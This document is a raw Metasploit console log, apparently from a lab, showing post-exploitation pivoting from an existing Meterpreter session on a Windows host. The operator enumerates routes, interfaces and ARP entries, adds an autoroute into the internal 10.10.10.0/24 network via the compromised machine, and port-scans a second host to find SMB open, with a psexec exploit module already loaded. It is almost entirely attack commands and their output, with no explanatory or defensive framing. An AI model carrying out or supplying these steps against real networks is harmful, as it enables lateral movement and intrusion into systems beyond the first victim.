```bash
meterpreter > shell
Process 3356 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.3532]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>route print
route print
===========================================================================
Interface List
  4...00 0c 29 bd 4b 1d ......Intel(R) 82574L Gigabit Network Connection
 10...00 0c 29 bd 4b 27 ......Intel(R) 82574L Gigabit Network Connection #2
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0      192.168.1.1     192.168.1.57     25
       10.10.10.0    255.255.255.0         On-link      10.10.10.129    281
     10.10.10.129  255.255.255.255         On-link      10.10.10.129    281
     10.10.10.255  255.255.255.255         On-link      10.10.10.129    281
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
      192.168.1.0    255.255.255.0         On-link      192.168.1.57    281
     192.168.1.57  255.255.255.255         On-link      192.168.1.57    281
    192.168.1.255  255.255.255.255         On-link      192.168.1.57    281
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link      192.168.1.57    281
        224.0.0.0        240.0.0.0         On-link      10.10.10.129    281
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link      192.168.1.57    281
  255.255.255.255  255.255.255.255         On-link      10.10.10.129    281
===========================================================================
Persistent Routes:
  None

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  4    281 ::/0                     fe80::ae3b:77ff:fe58:df72
  1    331 ::1/128                  On-link
  4    281 2a00:a040:181:ad58::/64  On-link
  4    281 2a00:a040:181:ad58::/64  fe80::ae3b:77ff:fe58:df72
  4    281 2a00:a040:181:ad58:69e2:665a:bd07:c074/128
                                    On-link
  4    281 2a00:a040:181:ad58:c825:718f:c08e:8ce7/128
                                    On-link
  4    281 fe80::/64                On-link
 10    281 fe80::/64                On-link
  4    281 fe80::69e2:665a:bd07:c074/128
                                    On-link
 10    281 fe80::c888:7b86:dbe2:6d04/128
                                    On-link
  1    331 ff00::/8                 On-link
  4    281 ff00::/8                 On-link
 10    281 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None

C:\Windows\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : 2a00:a040:181:ad58:69e2:665a:bd07:c074
   Temporary IPv6 Address. . . . . . : 2a00:a040:181:ad58:c825:718f:c08e:8ce7
   Link-local IPv6 Address . . . . . : fe80::69e2:665a:bd07:c074%4
   IPv4 Address. . . . . . . . . . . : 192.168.1.57
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::ae3b:77ff:fe58:df72%4
                                       192.168.1.1

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . : localdomain
   Link-local IPv6 Address . . . . . : fe80::c888:7b86:dbe2:6d04%10
   IPv4 Address. . . . . . . . . . . : 10.10.10.129
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 

C:\Windows\system32>arp -a
arp -a

Interface: 192.168.1.57 --- 0x4
  Internet Address      Physical Address      Type
  192.168.1.1           ac-3b-77-58-df-72     dynamic   
  192.168.1.39          00-0c-29-0c-34-09     dynamic   
  192.168.1.56          00-0c-29-1e-64-3f     dynamic   
  192.168.1.255         ff-ff-ff-ff-ff-ff     static    
  224.0.0.22            01-00-5e-00-00-16     static    
  224.0.0.251           01-00-5e-00-00-fb     static    
  224.0.0.252           01-00-5e-00-00-fc     static    
  239.255.255.250       01-00-5e-7f-ff-fa     static    
  255.255.255.255       ff-ff-ff-ff-ff-ff     static    

Interface: 10.10.10.129 --- 0xa
  Internet Address      Physical Address      Type
  10.10.10.1            00-50-56-c0-00-07     dynamic   
  10.10.10.128          00-0c-29-32-7a-a6     dynamic   
  10.10.10.255          ff-ff-ff-ff-ff-ff     static    
  224.0.0.22            01-00-5e-00-00-16     static    
  224.0.0.251           01-00-5e-00-00-fb     static    
  239.255.255.250       01-00-5e-7f-ff-fa     static    
  255.255.255.255       ff-ff-ff-ff-ff-ff     static    

C:\Windows\system32>^C
Terminate channel 1? [y/N]  y
meterpreter > run autoroute -s 10.10.10.0/24

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 10.10.10.0/255.255.255.0...
[+] Added route to 10.10.10.0/255.255.255.0 via 192.168.1.57
[*] Use the -p option to list all active routes
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.10.10.0         255.255.255.0      Session 1

meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/smb/psexec) > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner
   1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner
   3  auxiliary/scanner/portscan/xmas                                    normal  No     TCP "XMas" Port Scanner
   4  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner
   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner
   7  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator


Interact with a module by name or index. For example info 7, use 7 or use auxiliary/scanner/http/wordpress_pingback_access

msf6 exploit(windows/smb/psexec) > use 5
msf6 auxiliary(scanner/portscan/tcp) > options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf6 auxiliary(scanner/portscan/tcp) > set rhost 10.10.10.128
rhost => 10.10.10.128
msf6 auxiliary(scanner/portscan/tcp) > set rhosts 10.10.10.128
rhosts => 10.10.10.128
msf6 auxiliary(scanner/portscan/tcp) > set ports 445
ports => 445
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 10.10.10.128:         - 10.10.10.128:445 - TCP OPEN
[*] 10.10.10.128:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/portscan/tcp) >
```